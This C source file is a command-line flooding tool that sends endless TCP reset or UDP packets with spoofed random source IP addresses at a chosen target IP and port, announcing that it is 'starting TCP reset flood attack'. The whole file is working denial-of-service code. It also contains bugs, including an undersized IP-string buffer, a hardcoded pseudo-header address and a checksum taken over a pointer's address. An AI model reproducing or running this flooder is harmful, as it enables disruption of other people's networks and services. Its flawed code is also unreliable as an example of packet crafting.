#include <unistd.h>//for close()
#include<stdio.h>
#include<stdlib.h> 
#include<string.h> 
#include<arpa/inet.h> // for inet_ntoa()
#include<net/ethernet.h> //ethernet header
#include<netinet/ip.h>	//ip header
#include <netinet/udp.h> // udp header
#include <linux/tcp.h> //tcp header
#define D_TARGET_IP "127.0.0.1"
#define D_TARGET_PORT 443




struct pseudo_udp
{
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t fill_with_zeros;
	u_int8_t protocol;
	u_int16_t udp_length;
};



struct pseudo_tcp
{
    unsigned source_address;
    unsigned dest_address;
    unsigned char fill_with_zeros;
    unsigned char protocol;
    unsigned short tcp_len;
};



char* rand_ipv4();


unsigned short in_cksum (unsigned short *buf, int length)
{
   unsigned short *w = buf;
   int nleft = length;
   int sum = 0;
   unsigned short temp=0;

   /*
    * The algorithm uses a 32 bit accumulator (sum), adds
    * sequential 16 bit words to it, and at the end, folds back all 
    * the carry bits from the top 16 bits into the lower 16 bits.
    */
   while (nleft > 1)  {
       sum += *w++;
       nleft -= 2;
   }

   /* treat the odd byte at the end, if any */
   if (nleft == 1) {
        *(unsigned char *)(&temp) = *(unsigned char  *)w ;
        sum += temp;
   }

   /* add back carry outs from top 16 bits to low 16 bits */
   sum = (sum >> 16) + (sum & 0xffff);  // add hi 16 to low 16 
   sum += (sum >> 16);                  // add carry 
   return (unsigned short)(~sum);
}


//////////////////////

void send_raw_ip_packet(struct iphdr* ip)
{
    struct sockaddr_in dest_info;
    int enable = 1;
    
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);//create raw socket
    if(sock<0){
    	perror("[-] root privileges required ");
    	exit(1);
    	}

    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL,&enable, sizeof(enable))==-1)//socket option
      {
      	perror("setsockopt");
        exit(1);
        }
                     
    //destination info
    dest_info.sin_family = AF_INET;//ip v4
    dest_info.sin_addr.s_addr = ip->daddr;
    //send the packet
    if(sendto(sock, ip, ip->tot_len, 0, 
           (struct sockaddr *)&dest_info, sizeof(dest_info))==-1)
           {
           perror("sendto");
             exit(1);
           }
    close(sock);
}


void udp_flood(char *target_ip, int target_port)
{
     struct iphdr *ip;
     char *udp_data;

    while (1)
    {
    char* rnd_src_ip=rand_ipv4();
    char buffer[1500];
    memset(buffer, 0, 1500);

    //fill ip header
   ip = (struct iphdr *) buffer;
   udp_data=buffer+ sizeof(struct udphdr) +sizeof(struct iphdr);
   strcpy(udp_data,"flood udp!\n");
   int data_len=strlen(udp_data);
   ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr)+data_len;
   ip->version = 4;
   ip->ihl = 5;
   ip->ttl = 44;
   ip->saddr = inet_addr(rnd_src_ip);//spoofed src
   ip->daddr = inet_addr(target_ip);
   ip->protocol = IPPROTO_UDP;
  ip->check=0;
  struct udphdr *udp=(struct udphdr*) (buffer+sizeof(struct iphdr));
  //fill udp header
  udp->uh_sport=htons(rand()%6000);
  udp->uh_dport=htons(target_port);
  udp->len=htons(sizeof(struct udphdr)+data_len);
  udp->check=0;

  //checksum
  struct pseudo_udp ph;
	ph.source_address = inet_addr(rnd_src_ip);
	ph.dest_address =inet_addr(target_ip);
	ph.fill_with_zeros = 0;
	ph.protocol = IPPROTO_UDP;
	ph.udp_length = htons(sizeof(struct udphdr) + data_len);
    int size_for_chsum = sizeof(struct pseudo_udp) + sizeof(struct udphdr) + data_len;
	char *buf_for_chksum = malloc(size_for_chsum);
	memcpy(buf_for_chksum , (char*) &ph , sizeof (struct pseudo_udp));
	memcpy(buf_for_chksum + sizeof(struct pseudo_udp) , udp , sizeof(struct udphdr) + data_len);
	udp->check = in_cksum( (unsigned short*) buf_for_chksum , size_for_chsum);
    send_raw_ip_packet (ip);
    free(rnd_src_ip);
    free(buf_for_chksum);
    }
}

char* rand_ipv4(){
    char* needed_size="255.255.255.255";
    char *buff=malloc(strlen(needed_size));
    char *str_buff=malloc(sizeof(int)+1);
        memset(buff,0,strlen(needed_size));
        for (int i = 0; i < 4; i++) {
            sprintf(str_buff, "%d",rand()%255);
            if (i != 3)
                strcat(str_buff, ".");
            strcat(buff + i, str_buff);
        }
    
    return buff;
}


//ip src, src port, seq 
void tcp_rst_flood(char *target_ip, int target_port)
{
    struct iphdr *ip;
    while(1){
    char* rnd_src_ip=rand_ipv4();
    char buffer[1500];
   
    memset(buffer, 0, 1500);

    //fill ip header
   ip = (struct iphdr *) buffer;
   ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
   ip->version = 4;
   ip->ihl = 5;//header length
   ip->ttl = 44;
   ip->saddr = inet_addr(rnd_src_ip);//spoofed src
   ip->daddr = inet_addr(target_ip);
   ip->protocol = IPPROTO_TCP;
    ip->check=0;//auto calculates
  struct tcphdr *tcp=(struct tcphdr*) (buffer+sizeof(struct iphdr));

  //fill tcp header
  tcp->rst=1;
  tcp->source=htons(rand()%6000);//random src port
  tcp->dest=htons(target_port);
  tcp->seq=rand();//random sequence number
  tcp->window=htons(6034);
  tcp->doff=5;//length 5*4=20

  //calculate checksum with pseudoheader
  struct pseudo_tcp p_tcp;
  memset(&p_tcp,0x0,sizeof(struct pseudo_tcp));
  p_tcp.source_address=inet_addr(rnd_src_ip);
  p_tcp.dest_address=inet_addr("192.168.56.6");
  p_tcp.fill_with_zeros=0;
  p_tcp.protocol=IPPROTO_TCP;
  p_tcp.tcp_len=htons(sizeof(struct tcphdr));

  int size_for_chsum = sizeof(struct pseudo_tcp) + sizeof(struct tcphdr);
  char *buf_for_chksum = malloc(size_for_chsum);
  //memset(&buf_for_chksum,0x0,size_for_chsum);
  memcpy(buf_for_chksum , (char*) &p_tcp , sizeof (struct pseudo_tcp));
  memcpy(buf_for_chksum + sizeof(struct pseudo_tcp) , tcp , sizeof(struct tcphdr));
  tcp->check = in_cksum( (unsigned short*) &buf_for_chksum , size_for_chsum);
  send_raw_ip_packet (ip);
  free(rnd_src_ip);
  free(buf_for_chksum);
    }

}

//-t target ip
//-p target port 
//-r switch to udp from the default tcp reset
int main(int argc, char *argv[]){
  char *target_ip=D_TARGET_IP;
  int target_port=D_TARGET_PORT;
  int rst=1;
  for(int i=1;i<argc;i++)
  {
      if(strcmp(argv[i],"-t")==0)
      {
          if(i+1>=argc)
          {
            printf("[-] please enter a valid input\n");
            exit(EXIT_FAILURE);
          }
          target_ip=argv[i+1];
          i++;

      }
     else if(strcmp(argv[i],"-p")==0){
        if(i+1>=argc)
          {
            printf("[-] please enter a valid input\n");
            exit(EXIT_FAILURE);
          }
          target_port=atoi(argv[i+1]);//convert string to an integer value
          i++;

     }
     else if(strcmp(argv[i],"-r")==0){
         rst=0;
         i++;
     }

  }
  if(rst)
  {
      printf("[+] strating TCP reset flood attack\n[+] to STOP the attack press crtl+c\n");
      printf("[+] dest ip is: %s\n[+] dest port is: %d\n",target_ip,target_port);
     
      tcp_rst_flood(target_ip, target_port);
  }
  else
  {
      printf("[+] strating UDP flood attack\n[+] to STOP the attack press crtl+c\n");
      printf("[+] dest ip is: %s\n[+] dest port is: %d\n",target_ip,target_port);
      udp_flood(target_ip,target_port);
  }
    return 0;
}
 










